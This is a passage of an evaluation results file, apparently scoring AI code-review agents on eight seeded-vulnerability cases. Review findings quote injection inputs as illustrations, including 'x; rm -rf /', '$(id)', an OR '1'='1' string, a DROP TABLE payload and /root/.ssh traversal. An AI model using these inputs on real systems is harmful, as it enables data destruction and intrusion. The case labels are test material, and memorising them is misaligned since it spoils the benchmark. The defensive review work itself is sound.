@@ -1,0 +1,2652 @@
+{
+  "provider": "anthropic",
+  "models": {
+    "security": "claude-opus-5",
+    "correctness": "claude-opus-5",
+    "tests": "claude-sonnet-5",
+    "docs": "claude-haiku-4-5"
+  },
+  "cases": 8,
+  "overall": {
+    "hits": 8,
+    "allowed": 12,
+    "labels_found": 8,
+    "concerns": 8,
+    "duplicate_rate": 1.0,
+    "false_positives": 0,
+    "unlabelled": 0,
+    "misses": 0,
+    "precision_strict": 1.0,
+    "precision_lenient": 1.0,
+    "recall": 1.0,
+    "f1": 1.0
+  },
+  "by_agent": {
+    "correctness": {
+      "hits": 5,
+      "allowed": 5,
+      "labels_found": 5,
+      "concerns": 0,
+      "duplicate_rate": 0.0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "misses": 0,
+      "precision_strict": 1.0,
+      "precision_lenient": 1.0,
+      "recall": 1.0,
+      "f1": 1.0
+    },
+    "security": {
+      "hits": 3,
+      "allowed": 1,
+      "labels_found": 3,
+      "concerns": 0,
+      "duplicate_rate": 0.0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "misses": 0,
+      "precision_strict": 1.0,
+      "precision_lenient": 1.0,
+      "recall": 1.0,
+      "f1": 1.0
+    },
+    "tests": {
+      "hits": 0,
+      "allowed": 6,
+      "labels_found": 0,
+      "concerns": 0,
+      "duplicate_rate": 0.0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "misses": 0,
+      "precision_strict": 0.0,
+      "precision_lenient": 0.0,
+      "recall": 0.0,
+      "f1": 0.0
+    }
+  },
+  "calibration": {
+    "bins": [
+      {
+        "range": "0.50-0.60",
+        "n": 1,
+        "mean_confidence": 0.55,
+        "observed_hit_rate": 1.0,
+        "gap": 0.45
+      },
+      {
+        "range": "0.60-0.70",
+        "n": 1,
+        "mean_confidence": 0.62,
+        "observed_hit_rate": 1.0,
+        "gap": 0.38
+      },
+      {
+        "range": "0.80-0.90",
+        "n": 2,
+        "mean_confidence": 0.88,
+        "observed_hit_rate": 1.0,
+        "gap": 0.12
+      },
+      {
+        "range": "0.90-1.01",
+        "n": 4,
+        "mean_confidence": 0.963,
+        "observed_hit_rate": 1.0,
+        "gap": 0.037
+      }
+    ],
+    "expected_calibration_error": 0.152
+  },
+  "category_agreement": 0.875,
+  "agent_attribution": 1.0,
+  "decision_accuracy": 1.0,
+  "cost": {
+    "total_usd": 0.7158,
+    "per_case_usd": 0.0895
+  },
+  "per_case": [
+    {
+      "id": "neg-allowlisted-dynamic-sql",
+      "hits": 0,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "suppress",
+      "expected_decision": "suppress",
+      "confidence": 1.0,
+      "cost_usd": 0.0426,
+      "failed_agents": [],
+      "error": null,
+      "findings": []
+    },
+    {
+      "id": "sec-command-injection",
+      "hits": 2,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "escalate",
+      "expected_decision": "escalate",
+      "confidence": 0.772,
+      "cost_usd": 0.0907,
+      "failed_agents": [],
+      "error": null,
+      "findings": [
+        {
+          "match": "hit",
+          "agent": "correctness",
+          "category": "injection",
+          "severity": "critical",
+          "confidence": 0.982,
+          "where": "export/archive.py:8-10",
+          "title": "Unquoted f-string interpolated into shell=True command",
+          "body": "`cmd` is built by interpolating `name` and `directory` directly into a shell string and executed with `shell=True`. Two concrete failures: (1) correctness \u2014 any directory or archive name containing a space (`My Docs`) is split into two arguments and tar archives the wrong paths or fails; names containing `*`, `~` or `$` are expanded by the shell. (2) Anything containing `;`, `&&`, backticks or `$(...)` executes as a separate command with the privileges of this process. The sibling `list_exports` on line 5 already uses the correct form. Build an argument list and drop `shell`: `subprocess.run([\"tar\", \"-czf\", f\"/exports/{name}.tar.gz\", directory], check=True)`, and validate that `name` contains no path separators so it cannot escape `/exports`.\n\n_Also raised by the security agent:_ Shell injection via interpolated name/directory in create_archive",
+          "agreeing": [
+            "correctness",
+            "security"
+          ],
+          "categories": [
+            "injection"
+          ],
+          "matched_label": "export/archive.py:9",
+          "matched_labels": [
+            "export/archive.py:9"
+          ],
+          "cites": [
+            "export/archive.py:9",
+            "export/archive.py:10",
+            "export/archive.py:5"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "tests",
+          "category": "test_coverage",
+          "severity": "major",
+          "confidence": 0.6,
+          "where": "export/archive.py:8-10",
+          "title": "New create_archive function has no tests",
+          "body": "create_archive builds a shell command via string interpolation of `name` and `directory` and runs it with shell=True. There is no test in this diff exercising this function, so a change that broke archive creation (e.g. wrong tar flags, wrong path, or a regression allowing command injection through `name`/`directory`) would not be caught by any existing test suite.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": null,
+          "matched_labels": [],
+          "cites": [
+            "export/archive.py:8"
+          ]
+        },
+        {
+          "match": "hit",
+          "agent": "correctness",
+          "category": "api_contract",
+          "severity": "minor",
+          "confidence": 0.55,
+          "where": "export/archive.py:10",
+          "title": "create_archive returns CompletedProcess while list_exports returns bytes",
+          "body": "`list_exports` returns `.stdout` (bytes), whereas `create_archive` returns the whole `CompletedProcess` object. A caller treating the two module functions alike will get an object where it expects bytes. Consider returning the archive path (`/exports/{name}.tar.gz`) or `None`, so the return value is meaningful rather than an implementation detail of how the archive was produced.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "export/archive.py:9",
+          "matched_labels": [
+            "export/archive.py:9"
+          ],
+          "cites": [
+            "export/archive.py:5",
+            "export/archive.py:10"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-hardcoded-credential",
+      "hits": 2,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "escalate",
+      "expected_decision": "escalate",
+      "confidence": 0.799,
+      "cost_usd": 0.0945,
+      "failed_agents": [],
+      "error": null,
+      "findings": [
+        {
+          "match": "hit",
+          "agent": "security",
+          "category": "secrets",
+          "severity": "critical",
+          "confidence": 0.96,
+          "where": "billing/acmepay_client.py:4-8",
+          "title": "Live AcmePay secret key hardcoded in source, replacing env lookup",
+          "body": "`ACMEPAY_SECRET_KEY` is a literal credential with an `acme_live_` prefix, indicating a production API key, and it is now assigned to `acmepay.api_key` in place of the previous `os.environ[\"ACMEPAY_SECRET_KEY\"]` lookup. Anyone with read access to the repository (or to any clone, fork, CI log, container image, or packaged artifact built from it) can read this key and use it to issue charges, refunds, or read customer payment data against the live account.\n\nActions: (1) treat this key as compromised and rotate it at AcmePay immediately; (2) restore the `os.environ[\"ACMEPAY_SECRET_KEY\"]` read (or a secrets-manager lookup); (3) purge the value from git history, since reverting the commit leaves it retrievable; (4) consider a pre-commit secret scanner so the next one is caught before it lands.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "billing/acmepay_client.py:4",
+          "matched_labels": [
+            "billing/acmepay_client.py:4"
+          ],
+          "cites": [
+            "billing/acmepay_client.py:4",
+            "billing/acmepay_client.py:8"
+          ]
+        },
+        {
+          "match": "hit",
+          "agent": "correctness",
+          "category": "logic",
+          "severity": "major",
+          "confidence": 0.88,
+          "where": "billing/acmepay_client.py:4-8",
+          "title": "Key is no longer environment-configurable; all envs use one baked-in key",
+          "body": "`client()` previously read `os.environ[\"ACMEPAY_SECRET_KEY\"]`, which let each deployment (dev, CI, staging, prod) supply its own credential and failed loudly with `KeyError` when none was configured. After this change the value is a module constant, so any `ACMEPAY_SECRET_KEY` already set in deployment manifests or CI is silently ignored and every environment authenticates with the same `acme_live_...` value \u2014 non-production runs and test suites will issue real charges against the live account with no error to signal it. Restore the environment lookup (or route it through the project's settings/config layer) so the credential varies per environment and a missing value still fails fast.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "billing/acmepay_client.py:4",
+          "matched_labels": [
+            "billing/acmepay_client.py:4"
+          ],
+          "cites": [
+            "billing/acmepay_client.py:4",
+            "billing/acmepay_client.py:8"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "tests",
+          "category": "test_coverage",
+          "severity": "major",
+          "confidence": 0.6,
+          "where": "billing/acmepay_client.py:7-8",
+          "title": "client() key-source behavior change has no test verifying it",
+          "body": "client() previously read acmepay.api_key from os.environ[\"ACMEPAY_SECRET_KEY\"] and now assigns a hardcoded module-level constant. No test in this diff calls client() and asserts what acmepay.api_key ends up set to. The added tests/fixtures/acmepay.py only defines a fixture (fake_client/TEST_KEY) but does not invoke or assert against billing.acmepay_client.client(). If this wiring regresses (e.g., reverts to reading a stale env var, or points at the wrong key), no test would fail.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "tests/fixtures/acmepay.py:6",
+          "matched_labels": [
+            "tests/fixtures/acmepay.py:6"
+          ],
+          "cites": [
+            "billing/acmepay_client.py:7",
+            "tests/fixtures/acmepay.py:6"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "correctness",
+          "category": "test_quality",
+          "severity": "minor",
+          "confidence": 0.6,
+          "where": "tests/fixtures/acmepay.py:6-7",
+          "title": "fake_client() return shape does not match client()",
+          "body": "`client()` returns the `acmepay` module object (with the key set as the module attribute `api_key`), while `fake_client()` returns a plain dict `{\"api_key\": TEST_KEY}`. Anything that substitutes the fixture for the real client and then calls an API method (`acmepay.Charge.create(...)`, etc.) will fail with `TypeError`/`AttributeError` rather than exercising the code under test, and attribute-style access (`c.api_key`) will not work on the dict. Return a stub object exposing the same attributes/methods the production client is used through, so the fixture is a faithful stand-in.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "tests/fixtures/acmepay.py:6",
+          "matched_labels": [
+            "tests/fixtures/acmepay.py:6"
+          ],
+          "cites": [
+            "tests/fixtures/acmepay.py:6",
+            "billing/acmepay_client.py:7"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-sql-injection-fstring",
+      "hits": 1,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "escalate",
+      "expected_decision": "escalate",
+      "confidence": 0.902,
+      "cost_usd": 0.0941,
+      "failed_agents": [],
+      "error": null,
+      "findings": [
+        {
+          "match": "allowed",
+          "agent": "correctness",
+          "category": "api_contract",
+          "severity": "critical",
+          "confidence": 0.99,
+          "where": "billing/queries.py:8-10",
+          "title": "search_customers interpolates values instead of parameterising execute()",
+          "body": "`billing.db.execute` documents that `params` must carry every caller value, and the sibling `get_customer` on line 5 follows that by passing `(customer_id,)` with a `%s` placeholder. `search_customers` instead formats `term` and `status` directly into the SQL string and calls `execute(sql)` with no params. Two concrete consequences:\n\n1. Any value containing a single quote \u2014 a perfectly ordinary customer name such as `O'Brien` \u2014 terminates the string literal and produces a malformed statement, so the lookup raises instead of returning results. Worse, the same mechanism lets a caller-supplied `term`/`status` append arbitrary SQL, which is executed with the application's database privileges.\n2. `term` and `status` are not validated; a `None` reaching line 9 is rendered as the literal text `None` and silently matches nothing rather than erroring.\n\nRewrite using placeholders and let the driver bind the values, e.g.:\n\n```python\ndef search_customers(term, status):\n    sql = \"SELECT * FROM customers WHERE name LIKE %s AND status = %s\"\n    return execute(sql, (f\"%{term}%\", status))\n```\n\nThis keeps the LIKE wildcards in the parameter (not the SQL), matching the contract that `execute` states and that `get_customer` already honours.\n\n_Also raised by the docs agent:_ Public API violates documented db.execute() contract",
+          "agreeing": [
+            "correctness",
+            "docs"
+          ],
+          "categories": [
+            "api_contract"
+          ],
+          "matched_label": "billing/queries.py:9",
+          "matched_labels": [
+            "billing/queries.py:9"
+          ],
+          "cites": [
+            "billing/queries.py:9",
+            "billing/queries.py:10",
+            "billing/db.py:4",
+            "billing/queries.py:5",
+            "billing/queries.py:9",
+            "billing/queries.py:10"
+          ]
+        },
+        {
+          "match": "hit",
+          "agent": "security",
+          "category": "injection",
+          "severity": "critical",
+          "confidence": 0.92,
+          "where": "billing/queries.py:8-10",
+          "title": "SQL injection via f-string interpolation in search_customers",
+          "body": "`search_customers` concatenates `term` and `status` directly into the SQL string with an f-string and then calls `execute(sql)` with no `params`, so the values are parsed as SQL, not bound as data. Both values are inside single-quoted literals, so a supplied `'` closes the literal and everything after it is executed \u2014 e.g. `status = \"x' OR '1'='1\"` returns every customer row, and `term = \"%'; DROP TABLE customers; --\"` reaches the interpreter unescaped.\n\nUse the same parameterised form as `get_customer` on line 5, keeping the wildcards in the bound value rather than the SQL text:\n\n```python\ndef search_customers(term, status):\n    sql = \"SELECT * FROM customers WHERE name LIKE %s AND status = %s\"\n    return execute(sql, (f\"%{term}%\", status))\n```",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "billing/queries.py:9",
+          "matched_labels": [
+            "billing/queries.py:9"
+          ],
+          "cites": [
+            "billing/queries.py:9",
+            "billing/queries.py:10",
+            "billing/db.py:4",
+            "billing/queries.py:5"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "tests",
+          "category": "test_coverage",
+          "severity": "major",
+          "confidence": 0.75,
+          "where": "billing/queries.py:8-10",
+          "title": "No test exercises search_customers, including its unsafe query construction",
+          "body": "search_customers builds SQL by directly interpolating `term` and `status` into the query string instead of using the parameterised `execute(sql, params)` convention shown by get_customer just above it. There is no test file in this diff verifying the SQL produced or the values passed to execute, so a regression here (or the underlying injection risk) would not be caught by any existing suite.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": null,
+          "matched_labels": [],
+          "cites": [
+            "billing/queries.py:8"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-timing-unsafe-compare",
+      "hits": 1,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "auto_post",
+      "expected_decision": null,
+      "confidence": 0.795,
+      "cost_usd": 0.0702,
+      "failed_agents": [],
+      "error": null,
+      "findings": [
+        {
+          "match": "hit",
+          "agent": "correctness",
+          "category": "crypto",
+          "severity": "major",
+          "confidence": 0.99,
+          "where": "webhooks/verify.py:12",
+          "title": "verify_acmepay compares HMAC with == instead of compare_digest",
+          "body": "`verify_acmepay` computes the same hex-digest HMAC as `verify_stripe` but validates it with `expected == header`. Python's string `==` short-circuits on the first differing byte, so comparison time leaks how many leading hex characters of the signature are correct, allowing an attacker who can submit repeated webhook deliveries to recover a valid signature byte-by-byte without knowing the secret. Replace line 12 with `return hmac.compare_digest(expected, header)`, matching line 7.\n\nNote also the behavioural difference this introduces for callers: `compare_digest` raises `TypeError` on a non-str/bytes `header` (e.g. a missing header passed as `None`), whereas `==` silently returns `False`. Switching to `compare_digest` makes the two verifiers consistent, but confirm the call site handles a missing header before reaching this function.\n\n_Also raised by the security agent:_ Non-constant-time comparison of AcmePay webhook signature",
+          "agreeing": [
+            "correctness",
+            "security"
+          ],
+          "categories": [
+            "crypto"
+          ],
+          "matched_label": "webhooks/verify.py:12",
+          "matched_labels": [
+            "webhooks/verify.py:12"
+          ],
+          "cites": [
+            "webhooks/verify.py:12",
+            "webhooks/verify.py:7",
+            "webhooks/verify.py:10"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "tests",
+          "category": "test_coverage",
+          "severity": "major",
+          "confidence": 0.6,
+          "where": "webhooks/verify.py:10-12",
+          "title": "verify_acmepay added with no accompanying test",
+          "body": "The new verify_acmepay function is added with no test in this diff. Since no test file is included, there is nothing exercising it \u2014 a regression (e.g. wrong hash algorithm, swapped arguments, or the insecure `==` comparison instead of hmac.compare_digest used by verify_stripe) would not be caught by any existing or new test.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": null,
+          "matched_labels": [],
+          "cites": [
+            "webhooks/verify.py:10"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "sec-weak-password-hash",
+      "hits": 2,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "auto_post",
+      "expected_decision": null,
+      "confidence": 0.75,
+      "cost_usd": 0.0832,
+      "failed_agents": [],
+      "error": null,
+      "findings": [
+        {
+          "match": "hit",
+          "agent": "security",
+          "category": "crypto",
+          "severity": "major",
+          "confidence": 0.88,
+          "where": "auth/passwords.py:10-11",
+          "title": "Reset passwords hashed with unsalted MD5 instead of bcrypt",
+          "body": "`hash_reset_password` stores a user-supplied password as a single unsalted MD5 digest, while `hash_password` two lines above uses bcrypt with a per-password salt. MD5 is a fast, unsalted-here primitive: an adversary who obtains the stored value (SQL injection, backup/log exposure, insider access to the datastore) recovers the plaintext by rainbow-table lookup or offline brute force at billions of guesses per second, and because there is no salt, identical passwords across accounts produce identical digests so one crack breaks every matching account. If these digests are compared to authenticate a reset, that plaintext is a working credential for the account.\n\nUse the existing primitive: `return bcrypt.hashpw(raw.encode(), bcrypt.gensalt()).decode()`. If the intent was a one-time reset *token* rather than a password, do not hash a user-chosen secret at all \u2014 generate it with `secrets.token_urlsafe()`, store a SHA-256 of the high-entropy token, and compare with `hmac.compare_digest`.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "auth/passwords.py:11",
+          "matched_labels": [
+            "auth/passwords.py:11"
+          ],
+          "cites": [
+            "auth/passwords.py:10",
+            "auth/passwords.py:6"
+          ]
+        },
+        {
+          "match": "hit",
+          "agent": "correctness",
+          "category": "api_contract",
+          "severity": "major",
+          "confidence": 0.62,
+          "where": "auth/passwords.py:10-11",
+          "title": "Reset hash format is incompatible with bcrypt verification",
+          "body": "`hash_password` returns a bcrypt encoded string (`$2b$...`, self-describing salt and cost) while the new `hash_reset_password` returns a 32-character MD5 hex digest. If both values land in the same stored column, any verifier using `bcrypt.checkpw(raw.encode(), stored.encode())` will not match an MD5 digest \u2014 bcrypt treats a malformed hash as a non-match or raises `ValueError` depending on version, so reset-derived credentials will silently fail to authenticate (or blow up). No `verify_password` counterpart is added here, so nothing reconciles the two formats. Either produce a bcrypt hash in the reset path too (the raw material is identical \u2014 a plaintext string), or make the storage/verification path explicitly format-tagged. Note separately that MD5 here is unsalted and deterministic, so identical reset passwords collide to identical stored values.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "auth/passwords.py:10",
+          "matched_labels": [
+            "auth/passwords.py:10"
+          ],
+          "cites": [
+            "auth/passwords.py:6",
+            "auth/passwords.py:10"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "trap-md5-for-cache-key",
+      "hits": 0,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "escalate",
+      "expected_decision": null,
+      "confidence": 0.66,
+      "cost_usd": 0.1003,
+      "failed_agents": [],
+      "error": null,
+      "findings": [
+        {
+          "match": "allowed",
+          "agent": "correctness",
+          "category": "api_contract",
+          "severity": "major",
+          "confidence": 0.72,
+          "where": "render/cache.py:9",
+          "title": "json.dumps raises TypeError for contexts the old key accepted",
+          "body": "The previous key was `tuple(sorted(context.items()))`, which worked for any context whose keys were sortable and whose values were hashable \\u2014 `datetime`, `Decimal`, `UUID`, enum members, model instances, sets, etc. `json.dumps` accepts a far narrower domain and will raise `TypeError: Object of type X is not JSON serializable` for all of those. Any existing caller passing a non-JSON-native value in `context` goes from a working cached render to an uncaught exception at line 9, before `_render` is even reached. If the template engine itself accepts such values (most do), this is a live regression. Consider `json.dumps(..., default=repr)` or keeping a structural key and only digesting a canonical serialisation of primitives.",
+          "agreeing": [
+            "correctness"
+          ],
+          "categories": [
+            "api_contract",
+            "logic"
+          ],
+          "matched_label": "render/cache.py:9",
+          "matched_labels": [
+            "render/cache.py:9"
+          ],
+          "cites": [
+            "render/cache.py:9"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "tests",
+          "category": "test_coverage",
+          "severity": "major",
+          "confidence": 0.6,
+          "where": "render/cache.py:9-10",
+          "title": "No test covers context values that are hashable but not JSON-serializable",
+          "body": "The old key `tuple(sorted(context.items()))` worked for any hashable context values (tuples, frozensets, enums, custom objects with `__hash__`). The new key via `json.dumps([template_source, context], sort_keys=True)` requires every context value to be JSON-serializable, or `cached_render` now raises `TypeError` where it previously succeeded. None of the three tests in tests/test_cache.py pass a non-JSON-serializable-but-hashable context value, so this regression in accepted input types would go undetected.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": null,
+          "matched_labels": [],
+          "cites": [
+            "render/cache.py:9"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "trap-subprocess-list-args",
+      "hits": 0,
+      "missed": 0,
+      "false_positives": 0,
+      "unlabelled": 0,
+      "decision": "escalate",
+      "expected_decision": null,
+      "confidence": 0.612,
+      "cost_usd": 0.14,
+      "failed_agents": [],
+      "error": null,
+      "findings": [
+        {
+          "match": "allowed",
+          "agent": "tests",
+          "category": "test_quality",
+          "severity": "major",
+          "confidence": 0.75,
+          "where": "tests/test_archive.py:6-8",
+          "title": "Regression test only checks shell=False, not the argv structure",
+          "body": "`test_runs_without_a_shell` asserts `spy.last_call.kwargs[\"shell\"] is False` but never inspects `spy.last_call.args` (the actual list passed to subprocess.run). The vulnerability being fixed was shell command injection via string interpolation; the fix relies on both `shell=False` AND passing `name`/`directory` as separate list elements rather than interpolating them into one string. A future regression that reintroduces string interpolation (e.g. `[\"sh\", \"-c\", f\"tar -czf ... {directory}\"]`) while keeping `shell=False` would still pass this test, since only the `shell` kwarg is checked. The test should assert on the actual command list, e.g. that `directory` and the formatted name appear as separate argv elements.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "tests/test_archive.py:6",
+          "matched_labels": [
+            "tests/test_archive.py:6"
+          ],
+          "cites": [
+            "tests/test_archive.py:6"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "correctness",
+          "category": "api_contract",
+          "severity": "major",
+          "confidence": 0.6,
+          "where": "export/archive.py:4-10",
+          "title": "Name allowlist rejects previously accepted names (dots, dates, length > 64)",
+          "body": "`SAFE_NAME` permits only `[A-Za-z0-9_-]` and at most 64 characters, so names that the old implementation happily accepted \u2014 `\"2024.01.01-nightly\"`, `\"customer 42\"`, `\"tenant/daily\"`, or any long generated name \u2014 now raise `ValueError` at call time rather than producing an archive. This turns a working code path into an exception for callers that were never dangerous. Consider widening the class to include `.` (while still rejecting `..`, `/` and leading `-`), and check whether any caller builds names from timestamps or tenant identifiers.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "export/archive.py:11",
+          "matched_labels": [
+            "export/archive.py:11"
+          ],
+          "cites": [
+            "export/archive.py:4",
+            "export/archive.py:9"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "security",
+          "category": "input_validation",
+          "severity": "major",
+          "confidence": 0.55,
+          "where": "export/archive.py:7-15",
+          "title": "`directory` reaches tar unvalidated; arbitrary paths can be archived",
+          "body": "`name` is now constrained by `SAFE_NAME`, but `directory` is passed straight into the argv on line 12 with no check. The `--` separator correctly stops it being interpreted as a tar option, so this is not option or shell injection \u2014 but it does not stop it being any path on the filesystem. If a caller ever derives `directory` from request data (an export job spec, a form field, an API parameter), an attacker can pass `/etc`, `/root/.ssh`, or `../../<anything>` and get the contents written into `/exports/<name>.tar.gz`, which is presumably then served back to them: arbitrary file read.\n\nSuggest constraining `directory` the same way `name` is \u2014 resolve it with `os.path.realpath` and assert it stays under an allowed export root before invoking tar.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "export/archive.py:11",
+          "matched_labels": [
+            "export/archive.py:11"
+          ],
+          "cites": [
+            "export/archive.py:9",
+            "export/archive.py:12"
+          ]
+        },
+        {
+          "match": "allowed",
+          "agent": "correctness",
+          "category": "api_contract",
+          "severity": "major",
+          "confidence": 0.55,
+          "where": "export/archive.py:11-15",
+          "title": "`directory` is now one literal argv entry; multi-path/glob callers break",
+          "body": "Under the old `shell=True` form, `directory` was interpolated into a command string and therefore word-split and glob-expanded by the shell, so `create_archive(\"x\", \"/srv/a /srv/b\")` or `create_archive(\"x\", \"/srv/data/*\")` archived several paths. With the list form it is passed as a single literal operand, so tar looks for a directory whose name contains a space or a literal `*`, fails, and \u2014 because `check=True` \u2014 the caller now gets `CalledProcessError` instead of an archive. Please confirm no caller passes a composed path string; if any does, accept a sequence of directories and splat it into the argv list.",
+          "agreeing": [],
+          "categories": [],
+          "matched_label": "export/archive.py:11",
+          "matched_labels": [
+            "export/archive.py:11"
+          ],
+          "cites": [
+            "export/archive.py:7",
+            "export/archive.py:11"
+          ]
+        }
+      ]
+    }
+  ],
+  "stability": {
+    "runs": 3,
+    "precision_strict": [
+      1.0,
+      0.875,
+      1.0
+    ],
+    "recall": [
+      0.875,
+      0.875,
+      1.0
+    ],
+    "calibration_error": [
+      0.109,
+      0.147,
+      0.152
+    ],
+    "cost_per_case_usd": [
+      0.1089,
+      0.0907,
+      0.0895
+    ]
+  },
+  "runs": [
+    {
+      "provider": "anthropic",
+      "models": {
+        "security": "claude-opus-5",
+        "correctness": "claude-opus-5",
+        "tests": "claude-sonnet-5",
+        "docs": "claude-haiku-4-5"
+      },
+      "cases": 8,
+      "overall": {
+        "hits": 7,
+        "allowed": 16,
+        "labels_found": 7,
+        "concerns": 7,
+        "duplicate_rate": 1.0,
+        "false_positives": 0,
+        "unlabelled": 0,
+        "misses": 1,
+        "precision_strict": 1.0,
+        "precision_lenient": 1.0,
+        "recall": 0.875,
+        "f1": 0.933
+      },
+      "by_agent": {
+        "correctness": {
+          "hits": 4,
+          "allowed": 6,
+          "labels_found": 4,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 1,
+          "precision_strict": 1.0,
+          "precision_lenient": 1.0,
+          "recall": 0.8,
+          "f1": 0.889
+        },
+        "docs": {
+          "hits": 0,
+          "allowed": 2,
+          "labels_found": 0,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 0.0,
+          "precision_lenient": 0.0,
+          "recall": 0.0,
+          "f1": 0.0
+        },
+        "security": {
+          "hits": 3,
+          "allowed": 1,
+          "labels_found": 3,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 1.0,
+          "precision_lenient": 1.0,
+          "recall": 1.0,
+          "f1": 1.0
+        },
+        "tests": {
+          "hits": 0,
+          "allowed": 7,
+          "labels_found": 0,
+          "concerns": 0,
+          "duplicate_rate": 0.0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "misses": 0,
+          "precision_strict": 0.0,
+          "precision_lenient": 0.0,
+          "recall": 0.0,
+          "f1": 0.0
+        }
+      },
+      "calibration": {
+        "bins": [
+          {
+            "range": "0.60-0.70",
+            "n": 1,
+            "mean_confidence": 0.6,
+            "observed_hit_rate": 1.0,
+            "gap": 0.4
+          },
+          {
+            "range": "0.70-0.80",
+            "n": 1,
+            "mean_confidence": 0.78,
+            "observed_hit_rate": 1.0,
+            "gap": 0.22
+          },
+          {
+            "range": "0.90-1.01",
+            "n": 5,
+            "mean_confidence": 0.972,
+            "observed_hit_rate": 1.0,
+            "gap": 0.028
+          }
+        ],
+        "expected_calibration_error": 0.109
+      },
+      "category_agreement": 0.857,
+      "agent_attribution": 1.0,
+      "decision_accuracy": 1.0,
+      "cost": {
+        "total_usd": 0.8708,
+        "per_case_usd": 0.1089
+      },
+      "per_case": [
+        {
+          "id": "neg-allowlisted-dynamic-sql",
+          "hits": 0,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "suppress",
+          "expected_decision": "suppress",
+          "confidence": 1.0,
+          "cost_usd": 0.082,
+          "failed_agents": [],
+          "error": null,
+          "findings": []
+        },
+        {
+          "id": "sec-command-injection",
+          "hits": 2,
+          "missed": 0,
+          "false_positives": 0,
+          "unlabelled": 0,
+          "decision": "escalate",
+          "expected_decision": "escalate",
+          "confidence": 0.797,
+          "cost_usd": 0.1385,
+          "failed_agents": [],
+          "error": null,
+          "findings": [
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "injection",
+              "severity": "critical",
+              "confidence": 0.99,
+              "where": "export/archive.py:8-10",
+              "title": "Unquoted f-string into shell=True breaks on spaces and executes injected commands",
+              "body": "`cmd` is assembled by interpolating `name` and `directory` directly into a shell string and run with `shell=True`. Two concrete failures:\n\n1. Correctness: a directory like `my photos` is word-split by the shell, so tar receives two operands (`my` and `photos`) and fails or archives the wrong paths. Globs (`*`, `?`) and `~` are also expanded before tar sees them.\n2. Security: any metacharacter in `name` or `directory` \u2014 e.g. `directory=\"x; rm -rf /\"` or `name=\"a$(id)\"` \u2014 runs as a shell command with the process's privileges.\n\nDrop the shell entirely and pass an argument list, matching the style already used by `list_exports` on line 5:\n\n```python\nsubprocess.run([\"tar\", \"-czf\", f\"/exports/{name}.tar.gz\", \"--\", directory], check=True)\n```\n\nIf `name` can come from a caller-controlled source, also reject path separators so it cannot escape `/exports` (`name=\"../../etc/x\"` writes outside the export root).\n\n_Also raised by the security agent:_ Command injection via shell=True in create_archive",
+              "agreeing": [
+                "correctness",
+                "security"
+              ],
+              "categories": [
+                "injection"
+              ],
+              "matched_label": "export/archive.py:9",
+              "matched_labels": [
+                "export/archive.py:9"
+              ],
+              "cites": [
+                "export/archive.py:9",
+                "export/archive.py:10",
+                "export/archive.py:5"
+              ]
+            },
+            {
+              "match": "allowed",
+              "agent": "tests",
+              "category": "test_coverage",
+              "severity": "major",
+              "confidence": 0.65,
+              "where": "export/archive.py:8-10",
+              "title": "create_archive has no test coverage",
+              "body": "The new create_archive function builds and executes a shell command from the `name` and `directory` parameters (via f-string interpolation into `shell=True`). No test exercises this function, so there is nothing to catch regressions in argument handling, quoting, or unexpected behavior for inputs containing spaces or shell metacharacters. Add a test that calls create_archive with a representative name/directory and asserts on the resulting command or subprocess call behavior.",
+              "agreeing": [],
+              "categories": [],
+              "matched_label": null,
+              "matched_labels": [],
+              "cites": [
+                "export/archive.py:8"
+              ]
+            },
+            {
+              "match": "hit",
+              "agent": "correctness",
+              "category": "api_contract",
+              "severity": "minor",
+              "confidence": 0.6,
+              "where": "export/archive.py:8-10",
